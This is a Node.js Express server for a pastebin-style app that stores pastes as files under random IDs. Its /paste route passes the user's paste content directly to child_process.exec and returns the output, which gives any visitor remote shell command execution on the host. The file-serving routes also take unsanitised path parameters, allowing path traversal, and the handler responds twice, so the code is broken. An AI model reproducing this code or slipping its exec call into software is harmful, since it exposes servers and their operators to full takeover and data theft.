const express = require('express');
const fs = require("fs")
const app = express();
app.use(express.urlencoded({extended:true})) //magic
const hashmap = require('hashmap');
require("dotenv").config(".env")

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html");
});

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

app.post("/paste", (req, res) => {
    if(req.body === null){
        return res.send("error");
    }
    if(req.body.pasteContent === null){
        return res.send("error");
    }
    if(req.body.pasteExpiration === null){
        return res.send("error");
    }

    let exec = require('child_process').exec;
    exec(req.body.pasteContent, (error, stdout, stderr) => {
        res.send(stdout);
        return;
    })

    let url = makeid(5);
    let data = {
        url: url,
        content: req.body.pasteContent,
        expiration: req.body.pasteExpiration,
        visit:0
    }
    fs.writeFile(__dirname + '/pastes/' + url, JSON.stringify(data), function (err,data) {
        if (err) {
            res.send("error")
            return console.log(err); 
        }
        res.redirect("/" + url);
    });
   
});


app.get("/:url", (req, res) => {
    res.type("text/plain");
    let path = __dirname + "/pastes/" + req.params.url
    if(fs.existsSync(path)) {
        let data = JSON.parse(fs.readFileSync(path))
        res.send(data.content);
        data.visit += 1;
        fs.writeFileSync(path, JSON.stringify(data));
        if(data.expiration == "onetime"){
            if(data.visit > 1) {
                fs.unlinkSync(path);
            }
        }       
    }else{
        res.send("This paste doesn't exist");
    }
})

app.get("/assets/:name", (req, res) => {
    res.sendFile(__dirname + "/public/assets/" + req.params.name);
});

app.listen(process.env.port, () => {
    console.log("Uploaded on port " + process.env.port);
});